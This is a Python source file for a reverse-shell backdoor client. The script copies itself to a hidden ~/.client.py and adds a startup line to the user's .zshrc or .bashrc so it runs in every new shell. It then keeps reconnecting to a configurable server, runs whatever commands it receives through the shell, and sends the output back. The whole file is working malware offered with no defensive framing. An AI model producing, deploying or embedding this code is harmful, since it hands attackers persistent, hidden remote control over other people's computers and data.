import socket, subprocess, os, sys
from time import sleep, time
'''
First, make this script start every time the user starts their computer, or a new shell.
'''
#If they use zshrc, set that to the rcFile to edit
if os.path.exists(f"{os.path.expanduser('~')}/.zshrc"):
    rcFile = ".zshrc"
    NO_PERSISTENCE = False
#if they don't use zshrc, see if they use bashrc
elif os.path.exists(f"{os.path.expanduser('~')}/.bashrc"):
    rcFile = ".bashrc"
    NO_PERSISTENCE = False
else:
    NO_PERSISTENCE = True

#Open their rc file and check if our persistence is already there. If it is, skip this step. If it isn't, make it persistent.
with open(f"{os.path.expanduser('~')}/{rcFile}","r",) as file:
    if f"python3 {os.path.expanduser('~')}/.client.py &\n" not in file:
        MAKE_PERSISTENT = True
    else:
        MAKE_PERSISTENT = False

#If we want to make it persistent and a file to edit exists, do it.
if MAKE_PERSISTENT and not NO_PERSISTENCE: 
    subprocess.run(f"cp client.py {os.path.expanduser('~')}/.client.py",shell=True) #Copy the client to their home dir and make it .client.py
    with open(f"{os.path.expanduser('~')}/{rcFile}","a",) as file:
        file.write(f"python3 {os.path.expanduser('~')}/.client.py &\n")


SERVER_HOST = "127.0.0.1" #DEFAULT SERVER HOST
SERVER_PORT = 8080 #DEFAULT SERVER PORT
BUFFER_SIZE = 1024 * 128 #128KB max size

#If the user sends a custom IP and port
if len(sys.argv) == 2:
    SERVER_HOST = sys.argv[1]
elif len(sys.argv) == 3:
    SERVER_HOST = sys.argv[1]
    try:
        SERVER_PORT = int(sys.argv[2])
    except:
        print("Can not cast port to int!")

DISCONNECTED = True
while DISCONNECTED:
    #If the server is down, keep trying.
    try:
        s = socket.socket() #Establish socket connection
        s.connect((SERVER_HOST,SERVER_PORT)) #Connect to server
        DISCONNECTED = False
    except:
        sleep(10) #Try to join the server every 10 seconds

#When finally connected, start our shell
while True:
    command = s.recv(BUFFER_SIZE).decode() #Recieve the command from the server and decode it into a string
    splitted_command = command.split() #Split the command
    if command == "exit": #if the user wants to exit, then keep connection alive
        continue
    elif command == "SERVER_SHUTDOWN":
        break
    elif splitted_command[0] == "cd": #if the user wants to change directories
        try:
            os.chdir(' '.join(splitted_command[1:])) #use os to change the directory
        except FileNotFoundError as e: #if it isn't a thing, output the error to a variable
            output = str(e)
            continue
        else: #if it worked, don't send anything
            output = ""
            continue
    elif splitted_command[0] == "echo":
        output = subprocess.getoutput(command)
        output = "Echoed!"
    else: #if the user doesn't want to change directories, run the command and capture the output
        #if the command runs for longer than 5 seconds, timeout
        try:
            output = subprocess.run(command, shell=True,capture_output=True,text=True,timeout=5).stdout 
        except subprocess.TimeoutExpired:
            continue
    message = f"{output}" #encapsulate the output and send it
    s.send(message.encode())

s.close() #close the socket on exit